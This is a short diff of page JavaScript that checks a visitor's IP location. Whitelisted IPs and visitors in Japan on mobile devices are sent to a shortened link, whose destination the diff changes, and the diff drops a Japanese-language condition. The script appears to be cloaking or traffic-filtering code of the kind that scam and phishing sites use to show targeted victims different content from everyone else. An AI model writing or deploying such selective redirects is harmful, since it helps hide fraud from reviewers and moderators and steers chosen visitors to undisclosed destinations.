@@ -50,13 +50,13 @@
       .then(data => {
         // Check IP whitelist first
         if (ipWhitelist.includes(data.ip)) {
-          window.location.href = "https://lihi.cc/GMxgV";
+          window.location.href = "https://sourl.cn/rzNMSC";
           return;
         }
         
         // 严格的三重条件判断
-        if (data.country === 'JP' && isMobileDevice() && isJapaneseLang()) {
-          window.location.href = "https://lihi.cc/GMxgV";
+        if (data.country === 'JP' && isMobileDevice()) {
+          window.location.href = "https://sourl.cn/rzNMSC";
           return;
         }
      
@@ -69,7 +69,7 @@
       .catch(() => {
         // IP检测失败时严格的双重条件判断
         if (isMobileDevice() && isJapaneseLang()) {
-          window.location.href = "https://lihi.cc/GMxgV";
+          window.location.href = "https://sourl.cn/rzNMSC";
           return;
         }
         
